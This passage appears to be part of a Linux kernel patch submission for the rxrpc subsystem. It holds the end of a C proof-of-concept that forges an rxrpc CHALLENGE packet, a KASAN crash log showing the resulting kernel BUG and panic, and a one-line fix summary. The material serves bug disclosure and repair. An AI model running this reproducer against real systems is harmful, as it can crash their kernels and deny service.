+	struct rxrpc_wire_header chall;
+
+	memset(&chall, 0, sizeof(chall));
+	chall.epoch = htonl(observed->epoch);
+	chall.cid = htonl(observed->cid & ~3U);
+	chall.callNumber = htonl(0);
+	chall.seq = 0;
+	chall.serial = htonl(observed->serial + 1);
+	chall.type = RXRPC_PACKET_TYPE_CHALLENGE;
+	chall.flags = 0;
+	chall.userStatus = 0;
+	chall.securityIndex = RXRPC_SECURITY_NONE;
+	chall.reserved = 0;
+	chall.serviceId = htons(observed->serviceId);
+
+	if (sendto(server_fd, &chall, sizeof(chall), 0,
+		   (const struct sockaddr *)dst, sizeof(*dst)) != (ssize_t)sizeof(chall))
+		die("sendto(challenge)");
+}
+
+int main(int argc, char **argv)
+{
+	int server_fd, rxrpc_fd;
+	uint16_t server_port;
+	struct shared_state st;
+	struct rxrpc_wire_header observed;
+	struct sockaddr_in client_addr;
+	char payload[128];
+	pthread_t thr;
+	struct pollfd pfd;
+	int poll_ret;
+	int newnet_before = 0;
+
+	if (argc > 1 && strcmp(argv[1], "--newnet-before") == 0)
+		newnet_before = 1;
+
+	if (newnet_before) {
+		if (unshare(CLONE_NEWNET) < 0)
+			die("unshare(CLONE_NEWNET)");
+		bring_loopback_up();
+		printf("created dedicated net namespace and brought up lo\n");
+		fflush(stdout);
+	}
+
+	install_null_key();
+	server_fd = setup_server_udp(&server_port);
+	memset(&st, 0, sizeof(st));
+	rxrpc_fd = setup_rxrpc_client(server_port, &st.srx);
+	st.rxrpc_fd = rxrpc_fd;
+
+	if (pthread_create(&thr, NULL, sender_thread, &st) != 0) {
+		errno = EINVAL;
+		die("pthread_create");
+	}
+
+	st.ready = 1;
+	recv_data_packet(server_fd, &observed, &client_addr, payload, sizeof(payload));
+
+	printf("rxrpc packet: type=%u flags=0x%x epoch=%08x cid=%08x call=%u serial=%u service=%u payload=\"%s\"\n",
+	       observed.type, observed.flags, observed.epoch, observed.cid,
+	       observed.callNumber, observed.serial, observed.serviceId, payload);
+	fflush(stdout);
+
+	if (observed.type != RXRPC_PACKET_TYPE_DATA ||
+	    !(observed.flags & RXRPC_CLIENT_INITIATED) ||
+	    observed.callNumber == 0) {
+		fprintf(stderr, "did not capture the expected client DATA packet\n");
+		return 2;
+	}
+
+	send_forged_challenge(server_fd, &observed, &client_addr);
+	usleep(200000);
+
+	close(rxrpc_fd);
+	close(server_fd);
+
+	pfd.fd = -1;
+	pfd.events = 0;
+	poll_ret = poll(&pfd, 0, 500);
+	(void)poll_ret;
+
+	pthread_join(thr, NULL);
+	printf("sendmsg ret=%d errno=%d started=%d done=%d\n",
+	       st.send_ret, st.send_errno, st.send_started, st.send_done);
+	return 0;
+}
+
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[ 1457.338612][T10327] kernel BUG at net/rxrpc/conn_object.c:488!
+[ 1457.339724][T10327] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
+[ 1457.340600][T10327] CPU: 0 UID: 0 PID: 10327 Comm: kworker/u16:1 Not tainted 7.1.0-rc1 #2 PREEMPT(full)
+[ 1457.341809][T10327] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[ 1457.343167][T10327] Workqueue: netns cleanup_net
+[ 1457.343852][T10327] RIP: 0010:rxrpc_destroy_all_connections+0x35a/0x3f0
+[ 1457.344743][T10327] Code: 7c 04 84 c0 75 40 8b 43 64 85 c0 75 ca 4c 89 fe 4c 89 ef e8 08 40 bd f7 e9 1f ff ff ff 48 c7 c7 a0 be f1 8b e8 c7 40 c3 f7 90 <0f> 0b 48 89 df e8 fc be 4a f8 e9 2e fe ff ff 48 89 df e8 1f bf 4a
+[ 1457.347221][T10327] RSP: 0018:ffa000001338f980 EFLAGS: 00010246
+[ 1457.348029][T10327] RAX: 0000000000000017 RBX: ff1100007ea18000 RCX: 0000000000000000
+[ 1457.349044][T10327] RDX: 0000000000000000 RSI: ffffffff8b0f35c0 RDI: 0000000000000001
+[ 1457.350068][T10327] RBP: ff1100007ea18064 R08: 0000000000000001 R09: fff3fc0002671eed
+[ 1457.351135][T10327] R10: ffa000001338f76f R11: ffa000001338f708 R12: 1ff4000002671f32
+[ 1457.352175][T10327] R13: ff1100007ea18078 R14: ff1100007ea18088 R15: ff1100007ea17e70
+[ 1457.353203][T10327] FS:  0000000000000000(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
+[ 1457.354336][T10327] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 1457.355184][T10327] CR2: 0000560a4d9c42e8 CR3: 00000000717b2000 CR4: 0000000000751ef0
+[ 1457.356203][T10327] PKRU: 55555554
+[ 1457.356681][T10327] Call Trace:
+[ 1457.357121][T10327]  <TASK>
+[ 1457.357520][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.358273][T10327]  ? __pfx_rxrpc_destroy_all_connections+0x10/0x10
+[ 1457.359108][T10327]  ? __try_to_del_timer_sync+0xe2/0x140
+[ 1457.359846][T10327]  ? __pfx_var_wake_function+0x10/0x10
+[ 1457.360567][T10327]  rxrpc_exit_net+0x75/0xc0
+[ 1457.361146][T10327]  ops_undo_list+0x289/0x920
+[ 1457.361772][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.362510][T10327]  ? __pfx_ops_undo_list+0x10/0x10
+[ 1457.363184][T10327]  cleanup_net+0x40f/0x8f0
+[ 1457.363775][T10327]  ? __pfx_cleanup_net+0x10/0x10
+[ 1457.364420][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.365157][T10327]  ? rcu_is_watching+0x12/0xc0
+[ 1457.365788][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.366533][T10327]  process_one_work+0x8dc/0x1be0
+[ 1457.367198][T10327]  ? __pfx_process_one_work+0x10/0x10
+[ 1457.367893][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.368708][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.369436][T10327]  worker_thread+0x52d/0xec0
+[ 1457.370043][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.370780][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.371511][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.372224][T10327]  ? __kthread_parkme+0xb4/0x200
+[ 1457.372884][T10327]  ? __pfx_worker_thread+0x10/0x10
+[ 1457.373548][T10327]  kthread+0x312/0x410
+[ 1457.374072][T10327]  ? _raw_spin_unlock_irq+0x28/0x50
+[ 1457.374763][T10327]  ? __pfx_kthread+0x10/0x10
+[ 1457.375356][T10327]  ret_from_fork+0x600/0xa20
+[ 1457.376058][T10327]  ? __pfx_ret_from_fork+0x10/0x10
+[ 1457.376737][T10327]  ? srso_alias_return_thunk+0x5/0xfbef5
+[ 1457.377454][T10327]  ? __switch_to+0x57f/0xe20
+[ 1457.378062][T10327]  ? __pfx_kthread+0x10/0x10
+[ 1457.378662][T10327]  ret_from_fork_asm+0x1a/0x30
+[ 1457.379305][T10327]  </TASK>
+[ 1457.379716][T10327] Modules linked in:
+[ 1457.381610][T10327] ---[ end trace 0000000000000000 ]---
+[ 1457.383195][T10327] RIP: 0010:rxrpc_destroy_all_connections+0x35a/0x3f0
+[ 1457.384245][T10327] Code: 7c 04 84 c0 75 40 8b 43 64 85 c0 75 ca 4c 89 fe 4c 89 ef e8 08 40 bd f7 e9 1f ff ff ff 48 c7 c7 a0 be f1 8b e8 c7 40 c3 f7 90 <0f> 0b 48 89 df e8 fc be 4a f8 e9 2e fe ff ff 48 89 df e8 1f bf 4a
+[ 1457.387606][T10327] RSP: 0018:ffa000001338f980 EFLAGS: 00010246
+[ 1457.388571][T10327] RAX: 0000000000000017 RBX: ff1100007ea18000 RCX: 0000000000000000
+[ 1457.389648][T10327] RDX: 0000000000000000 RSI: ffffffff8b0f35c0 RDI: 0000000000000001
+[ 1457.390713][T10327] RBP: ff1100007ea18064 R08: 0000000000000001 R09: fff3fc0002671eed
+[ 1457.391795][T10327] R10: ffa000001338f76f R11: ffa000001338f708 R12: 1ff4000002671f32
+[ 1457.392985][T10327] R13: ff1100007ea18078 R14: ff1100007ea18088 R15: ff1100007ea17e70
+[ 1457.394253][T10327] FS:  0000000000000000(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
+[ 1457.395754][T10327] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 1457.396734][T10327] CR2: 0000560a4d9c42e8 CR3: 00000000717b2000 CR4: 0000000000751ef0
+[ 1457.398468][T10327] PKRU: 55555554
+[ 1457.399034][T10327] Kernel panic - not syncing: Fatal exception
+[ 1457.400254][T10327] Kernel Offset: disabled
+[ 1457.400839][T10327] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  rxrpc: fix null-security challenge leak
+
+ net/rxrpc/insecure.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+-- 
+2.55.0
